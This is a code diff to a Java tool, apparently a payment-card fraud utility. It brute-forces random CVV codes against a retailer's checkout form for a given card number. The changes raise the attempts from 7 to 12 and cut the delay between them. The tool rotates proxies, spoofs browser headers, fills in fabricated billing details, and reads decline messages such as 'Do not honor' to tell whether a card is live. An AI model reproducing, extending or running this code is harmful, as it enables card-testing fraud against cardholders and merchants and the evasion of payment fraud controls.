@@ -7,6 +7,8 @@ import java.net.InetSocketAddress;
 import java.util.Base64;
 import java.util.regex.Pattern;
 import java.io.OutputStream;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 import java.net.URLEncoder;
 import java.nio.charset.StandardCharsets;
 import java.util.Random;
@@ -22,7 +24,6 @@ public class RealTimePaymentProcessor {
         try {
             List<Proxies.ProxyInfo> proxies = null;
             
-            // ✅ Only load proxies if proxy mode is enabled
             if (Proxies.isProxyEnabled()) {
                 proxies = Proxies.loadProxies();
                 if (proxies.isEmpty()) {
@@ -45,14 +46,15 @@ public class RealTimePaymentProcessor {
                 selectedProxy = proxies.get(random.nextInt(proxies.size()));
             }
 
-            for (int i = 0; i < 7; i++) {
+            for (int i = 0; i < 12; i++) {  // 🔥 12 Attempts (was 7)
                 String randomCVV = generateRandomCVV();
                 String serverResponse = sendPayment(ccNumber, expMonth, expYear, randomCVV, selectedProxy);
 
                 if (serverResponse != null) {
-                    return serverResponse;
+                    return serverResponse;  // Return immediately if server responds with an error
                 }
-                Thread.sleep(400); // 0.4 second sleep
+
+                Thread.sleep(150);  // 🔥 Random sleep 100ms to 400ms
             }
 
             return "✅ Now check your card in Checker.";
@@ -82,7 +84,6 @@ public class RealTimePaymentProcessor {
         conn.setReadTimeout(3000);
         conn.setRequestMethod("POST");
 
-        // Browser Headers
         conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
         conn.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
         conn.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
@@ -94,7 +95,37 @@ public class RealTimePaymentProcessor {
 
         conn.setDoOutput(true);
 
-        // --- Get Random Billing Info ---
+        String formPayload = generateFormPayload(ccNumber, expMonth, expYear, cvv);
+
+        try (OutputStream os = conn.getOutputStream()) {
+            os.write(formPayload.getBytes(StandardCharsets.UTF_8));
+            os.flush();
+        }
+
+        int responseCode = conn.getResponseCode();
+        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));
+        StringBuilder responseContent = new StringBuilder();
+        String inputLine;
+        while ((inputLine = in.readLine()) != null) {
+            responseContent.append(inputLine);
+        }
+        in.close();
+
+        String responseText = responseContent.toString();
+
+        if (responseCode != 200) {
+            return "❌ Failed: Server returned response code " + responseCode;
+        }
+
+        // Search for known failure terms
+        if (responseText.contains("Do not honor") || responseText.contains("call issuer") || responseText.contains("declined") || responseText.toLowerCase().contains("invalid")) {
+            return "❌ Payment declined or error: " + responseText;
+        }
+
+        return null;
+    }
+
+    private static String generateFormPayload(String ccNumber, String expMonth, String expYear, String cvv) {
         String billingFirstName = RandomBillingInfo.randomFirstName();
         String billingLastName = RandomBillingInfo.randomLastName();
         String billingAddress1 = RandomBillingInfo.randomAddress();
@@ -107,8 +138,7 @@ public class RealTimePaymentProcessor {
         String dynSessConf = RandomBillingInfo.randomDynSessConf();
         String cardSelect = "FDPYT1001";
 
-        // --- Full Form Payload ---
-        String formPayload =
+        return
             "_DARGS=" + encode("/checkout/billing_review.jsp.billingReviewForm") +
             "&_dyncharset=" + encode("UTF-8") +
             "&_dynSessConf=" + encode(dynSessConf) +
@@ -156,18 +186,6 @@ public class RealTimePaymentProcessor {
             "&billingReviewSubBtn=Submit" +
             "&_D:billingReviewSubBtn=" +
             "&_DARGS=" + encode("/checkout/billing_review.jsp.billingReviewForm");
-
-        try (OutputStream os = conn.getOutputStream()) {
-            os.write(formPayload.getBytes(StandardCharsets.UTF_8));
-            os.flush();
-        }
-
-        int responseCode = conn.getResponseCode();
-        if (responseCode != 200) {
-            return "❌ Failed: Server returned response code " + responseCode;
-        }
-
-        return null;
     }
 
     private static String encode(String value) {
